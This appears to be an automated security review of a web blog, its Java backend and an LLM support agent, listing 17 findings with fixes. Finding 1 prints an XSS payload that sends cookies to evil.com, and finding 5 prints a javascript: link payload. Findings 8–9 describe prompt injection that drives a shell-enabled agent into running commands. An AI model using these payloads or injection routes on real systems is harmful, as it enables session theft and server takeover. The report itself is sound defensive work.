# Security Review Report

**Date:** 2026-02-10
**Scope:** Full repository — Node.js/Express frontend, Java/Spring Boot backend, support agent
**Reviewer:** Claude (automated security scan)

---

## Executive Summary

This review identified **17 security findings** across the application stack. Three are **Critical** severity and represent immediately exploitable attack vectors. The most urgent issue is the complete absence of authentication on admin and API write routes, combined with a stored XSS vulnerability that allows arbitrary JavaScript execution on any visitor's browser.

| Severity | Count |
| -------- | ----- |
| Critical | 3     |
| High     | 5     |
| Medium   | 6     |
| Low      | 3     |

---

## Critical Findings

### 1. Stored XSS via Unescaped HTML Rendering

**File:** `views/post.ejs:83`
**Severity:** Critical
**OWASP:** A03:2021 — Injection

```ejs
<%- post.content %>
```

The `<%-` EJS tag renders the `post.content` field as raw, unescaped HTML. Since post content is stored in the database and comes from user input via the admin editor (which explicitly accepts HTML), any JavaScript injected into a post will execute in every visitor's browser when they view that post.

**Attack scenario:** An attacker creates a post via the unauthenticated API containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. Every visitor to that post has their session data exfiltrated.

**Remediation:**

- Add authentication to admin/API routes (see Finding #2) as the primary control
- Implement server-side HTML sanitization (e.g., `DOMPurify` or `sanitize-html`) that strips `<script>`, event handlers, and `javascript:` URIs before storing content
- Consider using a markdown editor instead of raw HTML input

---

### 2. No Authentication on Admin Routes

**Files:** `server.js:452-475`
**Severity:** Critical
**OWASP:** A01:2021 — Broken Access Control

```javascript
// Anyone can access these routes:
app.get("/admin", (req, res) => { ... });
app.get("/admin/posts/new", (req, res) => { ... });
app.get("/admin/posts/:id/edit", (req, res) => { ... });
```

All admin pages are publicly accessible. There is no authentication middleware, login page, session management, or any form of access control. Any visitor can navigate to `/admin` and manage all blog content.

**Remediation:**

- Implement authentication middleware (e.g., Passport.js with session-based auth, or JWT)
- Add a login page and protect all `/admin/*` routes behind the auth middleware
- At minimum, use HTTP Basic Auth as an interim measure

---

### 3. No Authentication on API Write Endpoints

**Files:** `server.js:480-549`
**Severity:** Critical
**OWASP:** A01:2021 — Broken Access Control

```javascript
app.post("/api/posts", (req, res) => { ... });       // Create
app.put("/api/posts/:id", (req, res) => { ... });    // Update
app.delete("/api/posts/:id", (req, res) => { ... }); // Delete
```

All data-modifying API endpoints accept unauthenticated requests. Any external actor can create, modify, or delete blog posts by sending HTTP requests directly.

**Remediation:**

- Apply the same authentication middleware to all write API routes
- Return `401 Unauthorized` for unauthenticated requests
- Consider API key authentication for programmatic access

---

## High Findings

### 4. DOM-Based XSS in Client-Side Article Rendering

**File:** `views/article.ejs:183-198`
**Severity:** High
**OWASP:** A03:2021 — Injection

```javascript
article.sections.forEach((section) => {
  if (section.type === "heading") {
    html += `<h2>${section.heading}</h2>`;
  } else if (section.type === "paragraph") {
    html += `<p>${section.content}</p>`;
  } else if (section.type === "list") {
    section.items.forEach((item) => {
      html += `<li>${item}</li>`;
    });
  }
});
contentEl.innerHTML = html;
```

When the client-side fallback fetches article data from the Java backend, section content is interpolated into HTML strings via template literals and injected via `innerHTML` without sanitization. If the backend is compromised or returns attacker-controlled data, arbitrary JavaScript will execute.

**Remediation:**

- Use `textContent` instead of `innerHTML` for text-only fields
- If HTML is required, sanitize with DOMPurify before assigning to `innerHTML`

---

### 5. XSS via `javascript:` URIs in Chat Widget

**File:** `public/js/chat-widget.js:306-311`
**Severity:** High
**OWASP:** A03:2021 — Injection

```javascript
msg.innerHTML = text
  .replace(/&/g, "&amp;")
  .replace(/</g, "&lt;")
  .replace(/>/g, "&gt;")
  .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_top">$1</a>')
  .replace(/\n/g, "<br>");
```

While HTML entities are escaped, the markdown-to-link regex inserts the URL portion (`$2`) directly into an `href` attribute. An attacker-controlled agent response containing `[click here](javascript:alert(document.cookie))` would create a clickable XSS link. Since the support agent's response is driven by the LLM which processes user input, this is exploitable via prompt injection.

**Remediation:**

- Validate URLs in the regex replacement — only allow `http:` and `https:` protocols
- Example fix:
  ```javascript
  .replace(/\[([^\]]+)\]\((https?:\/\/[^)]+)\)/g, '<a href="$2" target="_top">$1</a>')
  ```

---

### 6. No CSRF Protection

**Files:** `server.js` (all POST/PUT/DELETE routes)
**Severity:** High
**OWASP:** A01:2021 — Broken Access Control

No CSRF tokens are generated or validated anywhere in the application. The admin editor submits forms via `fetch()` with JSON content type, and the API accepts JSON from any origin.

**Attack scenario:** An attacker hosts a page that sends a `fetch()` request to `http://target/api/posts` with a JSON body to create/modify/delete content when an admin visits the page.

**Remediation:**

- Implement CSRF token middleware (e.g., `csurf` or `csrf-csrf`)
- Include CSRF tokens in all forms and validate on the server
- Verify the `Origin` or `Referer` header on state-changing requests

---

### 7. Wildcard CORS on Java Backend

**File:** `backend/src/main/java/com/anthropic/articleservice/controller/ArticleController.java:12`
**Severity:** High
**OWASP:** A05:2021 — Security Misconfiguration

```java
@CrossOrigin(origins = "*")
public class ArticleController {
```

Wildcard CORS allows any website to make cross-origin requests to the article API and read responses. While the Java backend currently only serves read-only data, this eliminates same-origin policy protections entirely.

**Remediation:**

- Restrict to specific allowed origins:
  ```java
  @CrossOrigin(origins = {"http://localhost:3000", "https://your-production-domain.com"})
  ```

---

### 8. Agent Command Execution with Bypass Permissions

**File:** `agent/support-agent.mjs:56-62`
**Severity:** High
**OWASP:** A03:2021 — Injection

```javascript
for await (const msg of query({
    prompt,
    options: {
        allowedTools: ["Bash", "Read", "Grep", "WebSearch", "WebFetch"],
        permissionMode: "bypassPermissions",
        cwd: process.cwd(),
    },
}))
```

The support agent grants the LLM access to `Bash` with `permissionMode: "bypassPermissions"`. Combined with the prompt injection risk (user messages are concatenated directly into the prompt), a malicious user could craft inputs that cause the agent to execute arbitrary shell commands on the server.

**Remediation:**

- Remove `Bash` from `allowedTools` — a support agent should not need shell access
- Change `permissionMode` to `"default"` to require approval for sensitive operations
- Use the Claude Agent SDK's structured conversation API instead of string concatenation for prompts

---

## Medium Findings

### 9. Prompt Injection in Support Agent

**File:** `agent/support-agent.mjs:43-51`
**Severity:** Medium
**OWASP:** A03:2021 — Injection

```javascript
const prompt = conversationHistory
  ? `${SYSTEM_CONTEXT}\n\nConversation so far:\n${conversationHistory}\n\nUser: ${message}`
  : `${SYSTEM_CONTEXT}\n\nUser: ${message}`;
```

User messages and conversation history are concatenated directly into the system prompt as plain text. A user can craft messages that impersonate system instructions or override the agent's behavior. Combined with Finding #8, this allows arbitrary code execution.

**Remediation:**

- Use the Claude API's structured messages format with separate `system`, `user`, and `assistant` roles instead of string concatenation
- Implement input validation to reject suspicious patterns

---

### 10. Missing Security Headers

**File:** `server.js` (entire application)
**Severity:** Medium
**OWASP:** A05:2021 — Security Misconfiguration

The Express application sets no security-related HTTP headers. Missing headers include:

| Header                      | Risk                                             |
| --------------------------- | ------------------------------------------------ |
| `Content-Security-Policy`   | Allows inline scripts, external resource loading |
| `X-Content-Type-Options`    | MIME type sniffing attacks                       |
| `X-Frame-Options`           | Clickjacking                                     |
| `Strict-Transport-Security` | Downgrade attacks                                |
| `Referrer-Policy`           | Referrer leakage                                 |
| `Permissions-Policy`        | Unnecessary browser API access                   |

**Remediation:**

- Add the `helmet` middleware:
  ```javascript
  const helmet = require("helmet");
  app.use(helmet());
  ```

---

### 11. Error Message Information Disclosure

**Files:** `server.js:502, 529, 539`
**Severity:** Medium
**OWASP:** A04:2021 — Insecure Design

```javascript
res.status(400).json({ success: false, error: error.message });
```

Raw error messages from SQLite are returned to the client. These can reveal database schema details, query structure, and internal paths.

**Remediation:**

- Log the full error server-side
- Return generic error messages to the client:
  ```javascript
  res.status(400).json({ success: false, error: "Invalid request" });
  ```

---

### 12. No Rate Limiting

**File:** `server.js` (all routes), `agent/support-agent.mjs` (chat endpoint)
**Severity:** Medium
**OWASP:** A04:2021 — Insecure Design

No rate limiting exists on any endpoint. The `/api/chat` agent endpoint is especially concerning since each request triggers an LLM inference call that could be expensive.

**Remediation:**

- Add rate limiting middleware:
  ```javascript
  const rateLimit = require("express-rate-limit");
  app.use("/api/", rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
  ```
- Apply stricter limits to the agent chat endpoint

---

### 13. No Input Validation on Post API

**Files:** `server.js:480-531`
**Severity:** Medium
**OWASP:** A03:2021 — Injection

```javascript
const { title, slug, excerpt, content, category, published } = req.body;
```

No server-side validation on any field: no length limits, no type checking, no format validation on slugs, no allowlist for categories. While better-sqlite3 uses parameterized queries (preventing SQL injection), the lack of validation allows:

- Extremely large payloads (memory exhaustion)
- Invalid slugs that break routing
- Arbitrary category values

**Remediation:**

- Add input validation middleware (e.g., `express-validator` or `joi`)
- Enforce maximum lengths, slug format (`^[a-z0-9-]+$`), category allowlist

---

### 14. Unvalidated Redirect/Proxy in Article Route

**File:** `server.js:418-419`
**Severity:** Medium
**OWASP:** A10:2021 — Server-Side Request Forgery

```javascript
const response = await fetch(`http://localhost:8080/api/articles/${articleId}`);
```

The `articleId` parameter from the URL is interpolated directly into the backend URL. While the current Java backend uses a HashMap lookup (limiting exploitation), if the backend routing changes, an attacker could craft paths like `../admin/sensitive-endpoint` to reach unintended resources.

**Remediation:**

- Validate `articleId` format: `if (!/^[a-z0-9-]+$/.test(articleId)) return res.status(400).send('Invalid ID');`

---

## Low Findings

### 15. `package-lock.json` Excluded from Version Control

**File:** `.gitignore:2`
**Severity:** Low

```
package-lock.json
```

The lockfile is gitignored, meaning dependency versions aren't pinned across environments. Different `npm install` runs may resolve to different versions, potentially introducing vulnerabilities through version drift.

**Remediation:**

- Remove `package-lock.json` from `.gitignore` and commit the lockfile

---

### 16. Dashboard XSS via Post Title in `onclick`

**File:** `views/admin/dashboard.ejs:77`
**Severity:** Low
**OWASP:** A03:2021 — Injection

```ejs
<button onclick="deletePost(<%= post.id %>, '<%= post.title.replace(/'/g, "\\'") %>')">Delete</button>
```

The title is inserted into an inline `onclick` handler with only single-quote escaping. The `<%= %>` tag will HTML-encode the output, but if a title contains characters like `\` followed by specific sequences, it could break out of the JavaScript string context.

**Remediation:**

- Use data attributes instead of inline handlers:
  ```html
  <button
    data-id="<%= post.id %>"
    data-title="<%= post.title %>"
    class="delete-btn"
  >
    Delete
  </button>
  ```
  Then bind click handlers in JavaScript.

---

### 17. Hardcoded Internal Service URL

**Files:** `server.js:419`, `public/js/chat-widget.js:3-4`
**Severity:** Low

```javascript
// server.js
`http://localhost:8080/api/articles/${articleId}`;

// chat-widget.js
const AGENT_BASE = "http://localhost:3001";
```

Internal service URLs are hardcoded. This makes environment-specific configuration difficult and could leak internal architecture details if error messages reference these URLs.

**Remediation:**

- Use environment variables for service URLs:
  ```javascript
  const BACKEND_URL = process.env.BACKEND_URL || "http://localhost:8080";
  ```

---

## Remediation Priority

### Immediate (before any deployment)

1. **Add authentication** to admin routes and API write endpoints (Findings #2, #3)
2. **Sanitize HTML content** before storage/rendering (Finding #1)
3. **Remove Bash from agent tools** and fix permission mode (Finding #8)

### Short-term (within 1-2 weeks)

4. Add CSRF protection (Finding #6)
5. Restrict CORS origins on Java backend (Finding #7)
6. Add `helmet` for security headers (Finding #10)
7. Fix chat widget URL validation (Finding #5)
8. Sanitize client-side article rendering (Finding #4)

### Medium-term (within 1 month)

9. Add rate limiting (Finding #12)
10. Implement input validation (Finding #13)
11. Fix error message disclosure (Finding #11)
12. Restructure agent prompt handling (Finding #9)
13. Validate article ID format (Finding #14)

### Low priority

14. Commit package-lock.json (Finding #15)
15. Fix inline onclick handlers (Finding #16)
16. Use environment variables for service URLs (Finding #17)
